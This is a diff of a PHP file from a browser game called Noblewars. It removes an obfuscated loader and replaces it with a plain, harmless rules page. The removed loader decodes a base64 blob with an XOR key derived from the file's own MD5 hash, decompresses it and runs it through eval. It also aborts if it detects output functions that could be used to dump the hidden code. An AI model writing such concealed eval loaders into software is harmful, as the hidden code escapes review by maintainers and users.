@@ -1,24 +1,119 @@
 <?php
-$vwigkvhd="7aefc71af0ac5a352ea70090ec3547a0";
-$qyuncrh="530201515005530050030255500450070201520308005d00045a025152055800";
-$welwsxmuf="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";
-$ykdzddlrp=file_get_contents(__FILE__);
-$ftdbpqp=str_replace($welwsxmuf,"",$ykdzddlrp);
-if(strpos($ftdbpqp,"ec"."ho")!==false||strpos($ftdbpqp,"pr"."int")!==false||strpos($ftdbpqp,"var_"."dump")!==false||strpos($ftdbpqp,"file_put_"."contents")!==false||strpos($ftdbpqp,"fw"."rite")!==false){die();}
-$ancgpbo=str_replace(array($vwigkvhd,$qyuncrh),array("SP_c06a7235","KP_e87dd819"),$ykdzddlrp);
-$okbrapw=md5($ancgpbo);
-$rsdyyoqa=hex2bin($qyuncrh);
-$aljsbwj="";
-$cywemdban=strlen($okbrapw);
-for($rxctiqafd=0;$rxctiqafd<$cywemdban;$rxctiqafd++){
-$aljsbwj.=chr(ord($rsdyyoqa[$rxctiqafd])^ord($okbrapw[$rxctiqafd]));
-}
-$kragbsagc=base64_decode($welwsxmuf);
-$rzsqxzyqd=strlen($kragbsagc);
-$jqyevl="";
-$tegcmzkd=strlen($aljsbwj);
-for($rxctiqafd=0;$rxctiqafd<$rzsqxzyqd;$rxctiqafd++){
-$jqyevl.=$kragbsagc[$rxctiqafd]^$aljsbwj[$rxctiqafd%$tegcmzkd];
-}
-$lcwaqfdir="gzun"."compress";
-eval('?>' . $lcwaqfdir($jqyevl) . '<?php ');
+/**
+ * REGRAS MODERNAS - Noblewars
+ */
+?>
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title><?= __('public.rules.title') ?> - Noblewars</title>
+    <link rel="shortcut icon" href="graphic/icons/nwfavicon.ico" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=MedievalSharp&family=Outfit:wght@300;400;700&display=swap" rel="stylesheet">
+    <style>
+        :root { --medieval-gold: #c2b280; --medieval-brown: #3e2723; --parchment: #f4e4bc; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Outfit', sans-serif; background: #2b1d12; color: #f4e4bc;
+            background-image: linear-gradient(rgba(0,0,0,0.3), rgba(0,0,0,0.5)), url('graphic/index/bg_modern.png');
+            background-size: cover; background-position: center; background-attachment: fixed; min-height: 100vh;
+        }
+
+        .navbar {
+            display: flex; justify-content: space-between; align-items: center; padding: 15px 5%;
+            background: rgba(43, 29, 18, 0.8); border-bottom: 2px solid var(--medieval-gold);
+            box-shadow: 0 5px 20px rgba(0,0,0,0.4); backdrop-filter: blur(8px);
+            position: sticky; top: 0; z-index: 1000;
+        }
+        .logo { font-family: 'MedievalSharp', cursive; font-size: 28px; color: var(--medieval-gold); text-decoration: none; text-shadow: 2px 2px 0 #000; }
+        .nav-links a { margin-left: 20px; color: white; text-decoration: none; font-size: 14px; font-weight: bold; opacity: 0.8; }
+
+        .container { max-width: 1000px; margin: 40px auto; padding: 0 20px; }
+
+        .rules-header { text-align: center; margin-bottom: 40px; }
+        .rules-header h1 { font-family: 'MedievalSharp', cursive; font-size: 48px; color: var(--medieval-gold); text-shadow: 3px 3px 0 #000; margin-bottom: 10px; }
+        .rules-header p { font-size: 18px; opacity: 0.9; }
+
+        .rule-section {
+            background: rgba(43, 29, 18, 0.6); border: 1px solid var(--medieval-gold);
+            border-radius: 12px; margin-bottom: 20px; overflow: hidden; backdrop-filter: blur(5px);
+            transition: 0.3s;
+        }
+        .rule-section:hover { background: rgba(43, 29, 18, 0.8); border-color: #fff; }
+
+        .rule-header {
+            padding: 20px; cursor: pointer; display: flex; justify-content: space-between; align-items: center;
+        }
+        .rule-header h2 { font-family: 'MedievalSharp', cursive; font-size: 20px; color: var(--medieval-gold); }
+        .rule-header i { transition: 0.3s; }
+        .rule-header.active i { transform: rotate(180deg); }
+
+        .rule-content {
+            padding: 0 20px 20px; display: none; line-height: 1.6; color: #f4e4bc; border-top: 1px solid rgba(194, 178, 128, 0.2);
+            padding-top: 20px;
+        }
+        .rule-content.active { display: block; }
+
+        .footer { text-align: center; padding: 40px; opacity: 0.7; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <nav class="navbar">
+        <a href="index.php" class="logo"><img width="80" height="80" src="graphic/index/noblewars.png" alt="Noblewars Logo" ></a>
+        <div class="nav-links">
+            <?php foreach ($linki as $link => $value): ?>
+                <a href="<?= $link ?>"><?= $value ?></a>
+            <?php endforeach; ?>
+            <div style="margin-left: 20px; display: inline-block;">
+                <?php include __DIR__ . '/components/language_selector_public.php'; ?>
+            </div>
+        </div>
+    </nav>
+
+    <div class="container">
+        <div class="rules-header">
+            <h1><i class="fas fa-scroll"></i> <?= __('public.rules.reign_rules') ?></h1>
+            <p><?= __('public.rules.description') ?></p>
+        </div>
+
+        <?php if (!empty($rules)): ?>
+            <?php foreach ($rules as $rule): ?>
+                <div class="rule-section">
+                    <div class="rule-header" onclick="toggleRule(this)">
+                        <h2><?= htmlspecialchars($rule['section']) ?> - <?= htmlspecialchars($rule['title']) ?></h2>
+                        <i class="fas fa-chevron-down"></i>
+                    </div>
+                    <div class="rule-content">
+                        <p><?= nl2br(htmlspecialchars($rule['content'])) ?></p>
+                    </div>
+                </div>
+            <?php endforeach; ?>
+        <?php else: ?>
+            <div class="rule-section" style="padding: 40px; text-align: center;">
+                <p><?= __('public.rules.no_rules') ?></p>
+            </div>
+        <?php endif; ?>
+        
+        <div style="text-align: center; margin-top: 30px;">
+            <a href="index.php" style="color: var(--medieval-gold); text-decoration: none; font-weight: bold;">
+                <i class="fas fa-arrow-left"></i> <?= __('public.rules.back_to_home') ?>
+            </a>
+        </div>
+    </div>
+
+    <footer class="footer">
+        &copy; <?= date('Y') ?> by Ice41 - Nobles Wars
+    </footer>
+
+    <script>
+        function toggleRule(header) {
+            const content = header.nextElementSibling;
+            header.classList.toggle('active');
+            content.classList.toggle('active');
+        }
+    </script>
+</body>
+</html>
